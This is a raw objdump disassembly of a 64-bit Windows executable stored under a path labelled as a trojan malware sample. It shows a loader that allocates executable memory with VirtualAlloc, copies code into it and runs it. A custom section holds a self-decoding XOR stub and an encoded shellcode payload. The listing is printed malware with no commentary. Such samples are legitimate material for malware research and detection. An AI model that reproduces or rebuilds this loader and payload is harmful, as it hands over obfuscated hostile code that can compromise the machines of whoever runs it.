
malware_samples/trojan/994ffd669f2b7036a5c64b3a196f0d0b278975c8724f5d9b089e0d363498101f.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	49 c7 c1 40 00 00 00 	mov    $0x40,%r9
   14000100b:	49 c7 c0 00 30 00 00 	mov    $0x3000,%r8
   140001012:	48 c7 c2 00 10 00 00 	mov    $0x1000,%rdx
   140001019:	48 33 c9             	xor    %rcx,%rcx
   14000101c:	e8 27 10 00 00       	call   0x140002048
   140001021:	48 c7 c1 00 10 00 00 	mov    $0x1000,%rcx
   140001028:	48 be 41 10 00 40 01 	movabs $0x140001041,%rsi
   14000102f:	00 00 00 
   140001032:	48 8b f8             	mov    %rax,%rdi
   140001035:	f3 a4                	rep movsb (%rsi),(%rdi)
   140001037:	ff d0                	call   *%rax
   140001039:	48 33 c9             	xor    %rcx,%rcx
   14000103c:	e8 01 10 00 00       	call   0x140002042
   140001041:	50                   	push   %rax
   140001042:	41 59                	pop    %r9
   140001044:	4c                   	rex.WR
   140001045:	4f                   	rex.WRXB
   140001046:	41                   	rex.B
   140001047:	44 3a 00             	cmp    (%rax),%r8b
	...
   14000203e:	00 00                	add    %al,(%rax)
   140002040:	00 cc                	add    %cl,%ah
   140002042:	ff 25 c0 0f 00 00    	jmp    *0xfc0(%rip)        # 0x140003008
   140002048:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x140003000

Disassembly of section .yuww:

0000000140004000 <.yuww>:
   140004000:	eb 27                	jmp    0x140004029
   140004002:	5b                   	pop    %rbx
   140004003:	53                   	push   %rbx
   140004004:	5f                   	pop    %rdi
   140004005:	b0 9e                	mov    $0x9e,%al
   140004007:	fc                   	cld
   140004008:	ae                   	scas   (%rdi),%al
   140004009:	75 fd                	jne    0x140004008
   14000400b:	57                   	push   %rdi
   14000400c:	59                   	pop    %rcx
   14000400d:	53                   	push   %rbx
   14000400e:	5e                   	pop    %rsi
   14000400f:	8a 06                	mov    (%rsi),%al
   140004011:	30 07                	xor    %al,(%rdi)
   140004013:	48 ff c7             	inc    %rdi
   140004016:	48 ff c6             	inc    %rsi
   140004019:	66 81 3f 50 e2       	cmpw   $0xe250,(%rdi)
   14000401e:	74 07                	je     0x140004027
   140004020:	80 3e 9e             	cmpb   $0x9e,(%rsi)
   140004023:	75 ea                	jne    0x14000400f
   140004025:	eb e6                	jmp    0x14000400d
   140004027:	ff e1                	jmp    *%rcx
   140004029:	e8 d4 ff ff ff       	call   0x140004002
   14000402e:	13 9e ef 5b 90 f7    	adc    -0x86fa411(%rsi),%ebx
   140004034:	e3 fb                	jrcxz  0x140004031
   140004036:	df 13                	fists  (%rbx)
   140004038:	13 13                	adc    (%rbx),%edx
   14000403a:	52                   	push   %rdx
   14000403b:	42 52                	rex.X push %rdx
   14000403d:	43                   	rex.XB
   14000403e:	41                   	rex.B
   14000403f:	42 5b                	rex.X pop %rbx
   140004041:	22 c1                	and    %cl,%al
   140004043:	45 76 5b             	rex.RB jbe 0x1400040a1
   140004046:	98                   	cwtl
   140004047:	41 73 5b             	rex.B jae 0x1400040a5
   14000404a:	98                   	cwtl
   14000404b:	41 0b 5b 98          	or     -0x68(%r11),%ebx
   14000404f:	41 33 5b 1c          	xor    0x1c(%r11),%ebx
   140004053:	a4                   	movsb  (%rsi),(%rdi)
   140004054:	59                   	pop    %rcx
   140004055:	59                   	pop    %rcx
   140004056:	5b                   	pop    %rbx
   140004057:	98                   	cwtl
   140004058:	61                   	(bad)
   140004059:	43 5e                	rex.XB pop %r14
   14000405b:	22 da                	and    %dl,%bl
   14000405d:	5b                   	pop    %rbx
   14000405e:	22 d3                	and    %bl,%dl
   140004060:	bf 2f 72 6f 11       	mov    $0x116f722f,%edi
   140004065:	3f                   	(bad)
   140004066:	33 52 d2             	xor    -0x2e(%rdx),%edx
   140004069:	da 1e                	ficompl (%rsi)
   14000406b:	52                   	push   %rdx
   14000406c:	12 d2                	adc    %dl,%dl
   14000406e:	f1                   	int1
   14000406f:	fe 41 5b             	incb   0x5b(%rcx)
   140004072:	98                   	cwtl
   140004073:	41 33 52 42          	xor    0x42(%r10),%edx
   140004077:	98                   	cwtl
   140004078:	51                   	push   %rcx
   140004079:	2f                   	(bad)
   14000407a:	5b                   	pop    %rbx
   14000407b:	12 c3                	adc    %bl,%al
   14000407d:	75 92                	jne    0x140004011
   14000407f:	6b 0b 18             	imul   $0x18,(%rbx),%ecx
   140004082:	11 1c 96             	adc    %ebx,(%rsi,%rdx,4)
   140004085:	61                   	(bad)
   140004086:	13 13                	adc    (%rbx),%edx
   140004088:	13 98 93 9b 13 13    	adc    0x13139b93(%rax),%ebx
   14000408e:	13 5b 96             	adc    -0x6a(%rbx),%ebx
   140004091:	d3 67 74             	shll   %cl,0x74(%rdi)
   140004094:	5b                   	pop    %rbx
   140004095:	12 c3                	adc    %bl,%al
   140004097:	57                   	push   %rdi
   140004098:	98                   	cwtl
   140004099:	53                   	push   %rbx
   14000409a:	33 98 5b 0b 5a 12    	xor    0x125a0b5b(%rax),%ebx
   1400040a0:	c3                   	ret
   1400040a1:	43                   	rex.XB
   1400040a2:	f0 45 5e             	lock rex.RB pop %r14
   1400040a5:	22 da                	and    %dl,%bl
   1400040a7:	5b                   	pop    %rbx
   1400040a8:	ec                   	in     (%dx),%al
   1400040a9:	da 52 98             	ficoml -0x68(%rdx)
   1400040ac:	27                   	(bad)
   1400040ad:	9b                   	fwait
   1400040ae:	5b                   	pop    %rbx
   1400040af:	12 c5                	adc    %ch,%al
   1400040b1:	5b                   	pop    %rbx
   1400040b2:	22 d3                	and    %bl,%dl
   1400040b4:	52                   	push   %rdx
   1400040b5:	d2 da                	rcr    %cl,%dl
   1400040b7:	1e                   	(bad)
   1400040b8:	bf 52 12 d2 2b       	mov    $0x2bd21252,%edi
   1400040bd:	f3 66 e2 5f          	repz data16 loop 0x140004120
   1400040c1:	10 5f 37             	adc    %bl,0x37(%rdi)
   1400040c4:	1b 56 2a             	sbb    0x2a(%rsi),%edx
   1400040c7:	c2 66 cb             	ret    $0xcb66
   1400040ca:	4b 57                	rex.WXB push %r15
   1400040cc:	98                   	cwtl
   1400040cd:	53                   	push   %rbx
   1400040ce:	37                   	(bad)
   1400040cf:	5a                   	pop    %rdx
   1400040d0:	12 c3                	adc    %bl,%al
   1400040d2:	75 52                	jne    0x140004126
   1400040d4:	98                   	cwtl
   1400040d5:	1f                   	(bad)
   1400040d6:	5b                   	pop    %rbx
   1400040d7:	57                   	push   %rdi
   1400040d8:	98                   	cwtl
   1400040d9:	53                   	push   %rbx
   1400040da:	0f 5a 12             	cvtps2pd (%rdx),%xmm2
   1400040dd:	c3                   	ret
   1400040de:	52                   	push   %rdx
   1400040df:	98                   	cwtl
   1400040e0:	17                   	(bad)
   1400040e1:	9b                   	fwait
   1400040e2:	5b                   	pop    %rbx
   1400040e3:	12 c3                	adc    %bl,%al
   1400040e5:	52                   	push   %rdx
   1400040e6:	4b 52                	rex.WXB push %r10
   1400040e8:	4b                   	rex.WXB
   1400040e9:	4d                   	rex.WRB
   1400040ea:	4a                   	rex.WX
   1400040eb:	49 52                	rex.WB push %r10
   1400040ed:	4b 52                	rex.WXB push %r10
   1400040ef:	4a 52                	rex.WX push %rdx
   1400040f1:	49 5b                	rex.WB pop %r11
   1400040f3:	90                   	nop
   1400040f4:	ff 33                	push   (%rbx)
   1400040f6:	52                   	push   %rdx
   1400040f7:	41 ec                	rex.B in (%dx),%al
   1400040f9:	f3 4b 52             	repz rex.WXB push %r10
   1400040fc:	4a                   	rex.WX
   1400040fd:	49 5b                	rex.WB pop %r11
   1400040ff:	98                   	cwtl
   140004100:	01 fa                	add    %edi,%edx
   140004102:	58                   	pop    %rax
   140004103:	ec                   	in     (%dx),%al
   140004104:	ec                   	in     (%dx),%al
   140004105:	ec                   	in     (%dx),%al
   140004106:	4e 5a                	rex.WRX pop %rdx
   140004108:	ad                   	lods   (%rsi),%eax
   140004109:	64 60                	fs (bad)
   14000410b:	21 4c 20 21          	and    %ecx,0x21(%rax,%riz,1)
   14000410f:	13 13                	adc    (%rbx),%edx
   140004111:	52                   	push   %rdx
   140004112:	45 5a                	rex.RB pop %r10
   140004114:	9a                   	(bad)
   140004115:	f5                   	cmc
   140004116:	5b                   	pop    %rbx
   140004117:	92                   	xchg   %eax,%edx
   140004118:	ff b3 12 13 13 5a    	push   0x5a131312(%rbx)
   14000411e:	9a                   	(bad)
   14000411f:	f6 5a af             	negb   -0x51(%rdx)
   140004122:	11 13                	adc    %edx,(%rbx)
   140004124:	31 a4 43 5d 0b c8 52 	xor    %esp,0x52c80b5d(%rbx,%rax,2)
   14000412b:	47 5a                	rex.RXB pop %r10
   14000412d:	9a                   	(bad)
   14000412e:	f7 5f 9a             	negl   -0x66(%rdi)
   140004131:	e2 52                	loop   0x140004185
   140004133:	a9 5f 64 35 14       	test   $0x1435645f,%eax
   140004138:	ec                   	in     (%dx),%al
   140004139:	c6                   	(bad)
   14000413a:	5f                   	pop    %rdi
   14000413b:	9a                   	(bad)
   14000413c:	f9                   	stc
   14000413d:	7b 12                	jnp    0x140004151
   14000413f:	12 13                	adc    (%rbx),%dl
   140004141:	13 4a 52             	adc    0x52(%rdx),%ecx
   140004144:	a9 3a 93 78 13       	test   $0x1378933a,%eax
   140004149:	ec                   	in     (%dx),%al
   14000414a:	c6                   	(bad)
   14000414b:	79 19                	jns    0x140004166
   14000414d:	52                   	push   %rdx
   14000414e:	4d                   	rex.WRB
   14000414f:	43                   	rex.XB
   140004150:	43 5e                	rex.XB pop %r14
   140004152:	22 da                	and    %dl,%bl
   140004154:	5e                   	pop    %rsi
   140004155:	22 d3                	and    %bl,%dl
   140004157:	5b                   	pop    %rbx
   140004158:	ec                   	in     (%dx),%al
   140004159:	d3 5b 9a             	rcrl   %cl,-0x66(%rbx)
   14000415c:	d1 5b ec             	rcrl   $1,-0x14(%rbx)
   14000415f:	d3 5b 9a             	rcrl   %cl,-0x66(%rbx)
   140004162:	d2 52 a9             	rclb   %cl,-0x57(%rdx)
   140004165:	f9                   	stc
   140004166:	1c cc                	sbb    $0xcc,%al
   140004168:	f3 ec                	repz in (%dx),%al
   14000416a:	c6                   	(bad)
   14000416b:	5b                   	pop    %rbx
   14000416c:	9a                   	(bad)
   14000416d:	d4                   	(bad)
   14000416e:	79 03                	jns    0x140004173
   140004170:	52                   	push   %rdx
   140004171:	4b 5f                	rex.WXB pop %r15
   140004173:	9a                   	(bad)
   140004174:	f1                   	int1
   140004175:	5b                   	pop    %rbx
   140004176:	9a                   	(bad)
   140004177:	ea                   	(bad)
   140004178:	52                   	push   %rdx
   140004179:	a9 8a b6 67 72       	test   $0x7267b68a,%eax
   14000417e:	ec                   	in     (%dx),%al
   14000417f:	c6                   	(bad)
   140004180:	96                   	xchg   %eax,%esi
   140004181:	d3 67 19             	shll   %cl,0x19(%rdi)
   140004184:	5a                   	pop    %rdx
   140004185:	ec                   	in     (%dx),%al
   140004186:	dd 66 f6             	frstor -0xa(%rsi)
   140004189:	fb                   	sti
   14000418a:	80 13 13             	adcb   $0x13,(%rbx)
   14000418d:	13 5b 90             	adc    -0x70(%rbx),%ebx
   140004190:	ff 03                	incl   (%rbx)
   140004192:	5b                   	pop    %rbx
   140004193:	9a                   	(bad)
   140004194:	f1                   	int1
   140004195:	5e                   	pop    %rsi
   140004196:	22 da                	and    %dl,%bl
   140004198:	79 17                	jns    0x1400041b1
   14000419a:	52                   	push   %rdx
   14000419b:	4b 5b                	rex.WXB pop %r11
   14000419d:	9a                   	(bad)
   14000419e:	ea                   	(bad)
   14000419f:	52                   	push   %rdx
   1400041a0:	a9 11 ca db 4c       	test   $0x4cdbca11,%eax
   1400041a5:	ec                   	in     (%dx),%al
   1400041a6:	c6                   	(bad)
   1400041a7:	90                   	nop
   1400041a8:	eb 13                	jmp    0x1400041bd
   1400041aa:	6d                   	insl   (%dx),(%rdi)
   1400041ab:	46 5b                	rex.RX pop %rbx
   1400041ad:	90                   	nop
   1400041ae:	d7                   	xlat   (%rbx)
   1400041af:	33 4d 9a             	xor    -0x66(%rbp),%ecx
   1400041b2:	e5 79                	in     $0x79,%eax
   1400041b4:	53                   	push   %rbx
   1400041b5:	52                   	push   %rdx
   1400041b6:	4a 7b 13             	rex.WX jnp 0x1400041cc
   1400041b9:	03 13                	add    (%rbx),%edx
   1400041bb:	13 52 4b             	adc    0x4b(%rdx),%edx
   1400041be:	5b                   	pop    %rbx
   1400041bf:	9a                   	(bad)
   1400041c0:	e1 5b                	loope  0x14000421d
   1400041c2:	22 da                	and    %dl,%bl
   1400041c4:	52                   	push   %rdx
   1400041c5:	a9 4b b7 40 f6       	test   $0xf640b74b,%eax
   1400041ca:	ec                   	in     (%dx),%al
   1400041cb:	c6                   	(bad)
   1400041cc:	5b                   	pop    %rbx
   1400041cd:	9a                   	(bad)
   1400041ce:	d0 5a 9a             	rcrb   $1,-0x66(%rdx)
   1400041d1:	d4                   	(bad)
   1400041d2:	5e                   	pop    %rsi
   1400041d3:	22 da                	and    %dl,%bl
   1400041d5:	5a                   	pop    %rdx
   1400041d6:	9a                   	(bad)
   1400041d7:	e3 5b                	jrcxz  0x140004234
   1400041d9:	9a                   	(bad)
   1400041da:	c9                   	leave
   1400041db:	5b                   	pop    %rbx
   1400041dc:	9a                   	(bad)
   1400041dd:	ea                   	(bad)
   1400041de:	52                   	push   %rdx
   1400041df:	a9 11 ca db 4c       	test   $0x4cdbca11,%eax
   1400041e4:	ec                   	in     (%dx),%al
   1400041e5:	c6                   	(bad)
   1400041e6:	90                   	nop
   1400041e7:	eb 13                	jmp    0x1400041fc
   1400041e9:	6e                   	outsb  (%rsi),(%dx)
   1400041ea:	3b 4b 52             	cmp    0x52(%rbx),%ecx
   1400041ed:	44                   	rex.R
   1400041ee:	4a 7b 13             	rex.WX jnp 0x140004204
   1400041f1:	53                   	push   %rbx
   1400041f2:	13 13                	adc    (%rbx),%edx
   1400041f4:	52                   	push   %rdx
   1400041f5:	4b 79 13             	rex.WXB jns 0x14000420b
   1400041f8:	49 52                	rex.WB push %r10
   1400041fa:	a9 18 3c 1c 23       	test   $0x231c3c18,%eax
   1400041ff:	ec                   	in     (%dx),%al
   140004200:	c6 44 4a 52 a9       	movb   $0xa9,0x52(%rdx,%rcx,2)
   140004205:	66 7d 5e             	data16 jge 0x140004266
   140004208:	72 ec                	jb     0x1400041f6
   14000420a:	c6                   	(bad)
   14000420b:	5a                   	pop    %rdx
   14000420c:	ec                   	in     (%dx),%al
   14000420d:	dd fa                	(bad)
   14000420f:	2f                   	(bad)
   140004210:	ec                   	in     (%dx),%al
   140004211:	ec                   	in     (%dx),%al
   140004212:	ec                   	in     (%dx),%al
   140004213:	5b                   	pop    %rbx
   140004214:	12 d0                	adc    %al,%dl
   140004216:	5b                   	pop    %rbx
   140004217:	3a d5                	cmp    %ch,%dl
   140004219:	5b                   	pop    %rbx
   14000421a:	96                   	xchg   %eax,%esi
   14000421b:	e5 66                	in     $0x66,%eax
   14000421d:	a7                   	cmpsl  (%rdi),(%rsi)
   14000421e:	52                   	push   %rdx
   14000421f:	ec                   	in     (%dx),%al
   140004220:	f4                   	hlt
   140004221:	4b 79 13             	rex.WXB jns 0x140004237
   140004224:	4a 5a                	rex.WX pop %rdx
   140004226:	d4                   	(bad)
   140004227:	d1 e3                	shl    $1,%ebx
   140004229:	a6                   	cmpsb  (%rdi),(%rsi)
   14000422a:	b1 45                	mov    $0x45,%cl
   14000422c:	ec                   	in     (%dx),%al
   14000422d:	c6                   	(bad)
   14000422e:	50                   	push   %rax
   14000422f:	e2 58                	loop   0x140004289
   140004231:	42 00 00             	rex.X add %al,(%rax)
   140004234:	00 00                	add    %al,(%rax)
   140004236:	00 00                	add    %al,(%rax)
   140004238:	ff                   	(bad)
   140004239:	ff                   	(bad)
   14000423a:	ff                   	(bad)
   14000423b:	ff 70 42             	push   0x42(%rax)
   14000423e:	00 00                	add    %al,(%rax)
   140004240:	00 30                	add    %dh,(%rax)
	...
   140004256:	00 00                	add    %al,(%rax)
   140004258:	7e 42                	jle    0x14000429c
   14000425a:	00 00                	add    %al,(%rax)
   14000425c:	00 00                	add    %al,(%rax)
   14000425e:	00 00                	add    %al,(%rax)
   140004260:	8e 42 00             	mov    0x0(%rdx),%es
	...
   14000426f:	00 4b 45             	add    %cl,0x45(%rbx)
   140004272:	52                   	push   %rdx
   140004273:	4e                   	rex.WRX
   140004274:	45                   	rex.RB
   140004275:	4c 33 32             	xor    (%rdx),%r14
   140004278:	2e 64 6c             	cs fs insb (%dx),(%rdi)
   14000427b:	6c                   	insb   (%dx),(%rdi)
   14000427c:	00 00                	add    %al,(%rax)
   14000427e:	58                   	pop    %rax
   14000427f:	04 56                	add    $0x56,%al
   140004281:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%rdx),%esi
   140004288:	6c                   	insb   (%dx),(%rdi)
   140004289:	6c                   	insb   (%dx),(%rdi)
   14000428a:	6f                   	outsl  (%rsi),(%dx)
   14000428b:	63 00                	movsxd (%rax),%eax
   14000428d:	00 05 01 45 78 69    	add    %al,0x69784501(%rip)        # 0x1a9788794
   140004293:	74 50                	je     0x1400042e5
   140004295:	72 6f                	jb     0x140004306
   140004297:	63 65 73             	movsxd 0x73(%rbp),%esp
   14000429a:	73 00                	jae    0x14000429c
	...
   1400042a4:	08 00                	or     %al,(%rax)
	...
